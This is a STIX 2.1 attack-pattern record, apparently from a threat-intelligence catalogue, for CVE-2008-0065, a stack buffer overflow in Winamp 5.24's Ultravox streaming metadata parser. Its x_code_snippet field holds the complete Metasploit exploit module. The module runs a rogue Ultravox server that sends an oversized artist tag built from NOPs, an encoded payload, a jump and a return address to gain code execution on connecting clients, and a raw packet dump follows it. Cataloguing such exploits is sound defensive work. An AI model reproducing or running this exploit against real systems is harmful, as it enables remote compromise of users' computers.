{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--297a7e9a-26f5-4844-a9df-774b5bae50c8",
    "created": "2024-08-14T16:40:39.508606Z",
    "modified": "2024-08-14T16:40:39.50861Z",
    "name": "Winamp Ultravox Streaming Metadata (in_mp3.dll) Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Winamp 5.24. By sending an overly long artist tag, a remote attacker may be able to execute arbitrary code. This vulnerability can be exploited from the browser or the Winamp client itself. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/winamp_ultravox.rb",
            "external_id": "winamp_ultravox.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0065"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Winamp Ultravox Streaming Metadata (in_mp3.dll) Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Winamp 5.24. By\n        sending an overly long artist tag, a remote attacker may\n        be able to execute arbitrary code. This vulnerability can be\n        exploited from the browser or the Winamp client itself.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-0065' ],\n          [ 'OSVDB', '41707' ],\n          [ 'BID', '27344' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 700,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Winamp 5.24', { 'Ret' => 0x15010d3e } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2008-01-18',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The HTTP daemon port to listen on.\", 8080 ])\n      ])\n  end\n\n  def on_client_connect(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    res = client.get_once\n\n    content =  \"\\x00\\x01\\x00\\x01\\x00\\x01\" + \"<metadata><song><artist>\"\n    content << make_nops(3828 - payload.encoded.length) + payload.encoded\n    content << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')\n    content << [0xe8, -850].pack('CV') + rand_text_alpha_upper(1183)\n    content << \"</artist></song></metadata>\"\n\n    sploit =  \"\\x5a\\x00\\x39\\x01\" + [content.length].pack('n')\n    sploit << content + \"\\x00\"\n\n    # randomize some stuff.\n    num    = rand(65535).to_s\n\n    header =  \"HTTP/1.0 200 OK\\r\\n\"\n    header << \"Server: Ultravox 3.0\\r\\n\"\n    header << \"Content-Type: misc/ultravox\\r\\n\"\n    header << \"Ultravox-SID: #{num}\\r\\n\"\n    header << \"Ultravox-Avg-Bitrate: #{num}\\r\\n\"\n    header << \"Ultravox-Max-Bitrate: #{num}\\r\\n\"\n    header << \"Ultravox-Max-Msg: #{num}\\r\\n\"\n    header << \"Ultravox-Stream-Info: Ultravox;Live Stream\\r\\n\"\n    header << \"Ultravox-Msg-Que: #{num}\\r\\n\"\n    header << \"Ultravox-Max-Fragments: 1\\r\\n\\r\\n\"\n    header << sploit\n\n    print_status(\"Sending #{header.length} bytes\")\n\n    client.put(header)\n    handler(client)\n\n    service.close_client(client)\n  end\nend\n\n\n=begin\nHTTP/1.0 200\n.Server: Ultravo\nx 3.0..Content-T\nype: misc/ultrav\nox..Ultravox-SID\n: 22221..Ultravo\nx-Avg-Bitrate: 6\n4000..Ultravox-M\nax-Bitrate: 9600\n0..Ultravox-Max-\nMsg: 16000..Ultr\navox-Stream-Info\n: Ultravox;Live\nStream..Ultravox\n-Msg-Que: 39..Ul\ntravox-Max-Fragm\n\nZ.9..,......<met\nadata><length>0<\n/length><soon>Mo\nre on\n</soon><song><na\nme>The Night\nghts In\ntin</name><album\n>Days Of\nPassed</album><a\nrtist>The Moody\nBlues</artist><a\nlbum_art>xm/stat\nion_logo_WBCRHT.\njpg</album_art><\nalbum_art_200>xm\n/station_logo_WB\nCRHT_200.jpg</al\nbum_art_200><ser\nial>-1</serial><\nsong_id>-1</song\n_id><amg_song_id\n>-1</amg_song_id\n><amg_artist_id>\n-1</amg_artist_i\nd><amg_album_id>\n-1</amg_album_id\n><itunes_song_id\n>-1</itunes_song\n_id><itunes_arti\nst_id>-1</itunes\n_artist_id><itun\nes_album_id>-1</\nitunes_album_id>\n</song></metadat\na>.Z.......\\./!.\n!.UP.......B...&\nZ....D)ydB.,.vy/\n=end\n",
    "x_mitre_disclosure_date": "2008-01-18",
    "x_mitre_platforms": [
        "win'"
    ]
}